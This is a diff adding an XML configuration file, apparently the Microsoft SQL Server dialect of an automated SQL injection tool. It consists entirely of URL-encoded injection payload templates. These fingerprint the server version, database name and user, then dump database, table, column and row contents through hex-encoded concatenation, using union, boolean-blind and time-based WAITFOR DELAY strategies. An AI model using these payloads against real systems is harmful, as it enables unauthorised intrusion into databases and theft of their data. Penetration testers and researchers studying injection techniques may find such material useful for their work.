@@ -1,0 +1,154 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+SELECT 
+    %20@@version
+    %2B'${ENCLOSE_VALUE_SQL}'
+    %2BDB_NAME()
+    %2B'${ENCLOSE_VALUE_SQL}'
+    %2Buser
+    %2B'${TRAIL_SQL}'
+        </info>
+        <schema>
+            <database>
+SELECT replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(
+(
+    SELECT replace(sys.fn_varbintohexstr(CAST(
+        ','
+        %2b'${ENCLOSE_VALUE_SQL}'
+        %2BCAST(name AS VARCHAR(MAX))
+        %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        AS VARBINARY(MAX)
+    )),'0x','')
+    FROM (
+        select 
+            name,
+            ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+        from master..sysdatabases
+    )x
+    where 1=1
+    {limit}
+    FOR XML PATH('')
+)
+,1,1,''),2))%2B'${TRAIL_SQL}',',','${SEPARATOR_CELL_SQL}')
+            </database>
+            <table>
+SELECT replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(
+(
+    SELECT replace(sys.fn_varbintohexstr(CAST(
+        ','
+        %2b'${ENCLOSE_VALUE_SQL}'
+        %2BCAST(name AS VARCHAR(MAX))
+        %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        AS VARBINARY(MAX)
+    )),'0x','')
+    FROM (
+        select 
+            name, 
+            ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+        from ${DATABASE}..sysobjects 
+        WHERE xtype='U'
+    )x
+    where 1=1
+    {limit}
+    FOR XML PATH('')
+)
+,1,1,''),2))%2B'${TRAIL_SQL}',',','${SEPARATOR_CELL_SQL}')
+            </table>
+            <column>
+SELECT replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(
+(
+    SELECT replace(sys.fn_varbintohexstr(CAST(
+        ','
+        %2b'${ENCLOSE_VALUE_SQL}'
+        %2BCAST(name AS VARCHAR(MAX))
+        %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        AS VARBINARY(MAX)
+    )),'0x','')
+    FROM (
+        select 
+            c.name, 
+            ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+        FROM
+            ${DATABASE}..syscolumns c,
+            ${DATABASE}..sysobjects t
+        WHERE c.id=t.id
+        AND t.name='${TABLE}'
+    )x
+    where 1=1
+    {limit}
+    FOR XML PATH('')
+)
+,1,1,''),2))%2B'${TRAIL_SQL}',',','${SEPARATOR_CELL_SQL}')
+            </column>
+            <row>
+                <query>
+SELECT replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(
+(
+    SELECT 
+	    replace(sys.fn_varbintohexstr(CAST(
+	        ','
+	        %2b'${ENCLOSE_VALUE_SQL}'
+	        %2BCAST(${FIELDS} AS VARCHAR(MAX))
+	        %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+	        AS VARBINARY(MAX)
+	    )),'0x','')
+    FROM (
+        select 
+            *, 
+            ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+        FROM ${DATABASE}.dbo.${TABLE}
+    )x
+    where 1=1
+    {limit}
+    FOR XML PATH('')
+)
+,1,1,''),2))%2B'${TRAIL_SQL}',',','${SEPARATOR_CELL_SQL}')
+                </query>
+                <fields>
+                <field>LTRIM(RTRIM(coalesce(${FIELD},'')))</field>
+                <concat>%2b'%7f'%2b</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+(select'SQLi'%2Bsubstring((${INJECTION}),${INDEX},65536))
+            </slidingWindow>
+            <limit> and rnum BETWEEN ${LIMIT} AND 65536</limit>
+            <failsafe>CONVERT(varchar,(1337${INDICE}7330%2b1))</failsafe>
+            <calibrator>replicate(0x23,1024)</calibrator>
+            <limitBoundary>1</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${INDICES}</indices>
+            <capacity>(select concat('SQLi${INDICE}',replicate(0x23,1024),'iLQS'))</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+        <boolean>
+            <test>
+                <false>1=0</false>
+                <false>'a'%21='a'</false>
+                <false>'b'%21='b'</false>
+                <false>1=2</false>
+                <false>1%21=1</false>
+                <false>2%21=2</false>
+                <true>1=1</true>
+                <true>0=0</true>
+                <true>'a'%21='b'</true>
+                <true>'a'='a'</true>
+                <true>2=2</true>
+                <true>1%21=2</true>
+                <initialization>0%2b1=1</initialization>
+                <bit>0!=(ascii(substring(${INJECTION},${INDEX},1))%26${BIT})</bit>
+                <length>len(${INJECTION})>${INDEX}</length>
+            </test>
+            <blind> and ${TEST}</blind>
+            <time>;if(${TEST})WAITFOR DELAY'00:00:00'else WAITFOR DELAY'00:00:${SLEEP_TIME}'</time>
+        </boolean>
+    </strategy>
+</model>
